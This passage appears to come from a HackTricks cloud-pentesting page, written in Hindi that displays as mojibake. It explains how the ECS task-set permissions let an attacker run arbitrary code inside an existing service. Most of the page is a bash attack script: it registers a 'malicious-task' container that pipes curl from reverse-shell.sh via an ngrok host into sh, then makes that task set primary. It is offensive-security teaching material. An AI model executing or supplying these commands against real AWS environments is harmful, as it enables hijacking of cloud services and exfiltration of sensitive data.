TODO: ‡§á‡§∏‡•á ‡§ü‡•á‡§∏‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç
{% endhint %}

‡§ú‡§ø‡§®‡§ï‡•á ‡§™‡§æ‡§∏ `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, ‡§î‡§∞ `ecs:DescribeTaskSets` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å ‡§π‡•à‡§Ç, ‡§µ‡•á **‡§è‡§ï ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ECS ‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§ó‡•ç‡§Ø‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§∏‡•á‡§ü ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡§æ‡§•‡§Æ‡§ø‡§ï ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§∏‡•á‡§ü ‡§ï‡•ã ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§á‡§∏‡§∏‡•á ‡§Ö‡§ü‡•à‡§ï‡§∞ ‡§ï‡•ã **‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§µ‡§ø‡§µ‡§ø‡§ß ‡§ï‡•ã‡§° ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø** ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§
```bash
bashCopy code# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ**: ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∏‡•á‡§µ‡§æ ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§ö‡§ø‡§§‡•ç‡§∞ ‡§ï‡•ã‡§° ‡§ï‡§æ ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§ï‡§∞‡•á‡§Ç, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§â‡§∏‡§ï‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§™‡§∞ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ ‡§™‡§°‡§º ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§Ø‡§æ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§¨‡§æ‡§π‡§∞ ‡§≤‡•á ‡§ú‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä HackTricks ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§ø‡§§ ‡§π‡•ã** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏ ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§≤‡•á‡§ï‡•ç‡§∂‡§®, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, HackTricks** ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á‡•§

</details>
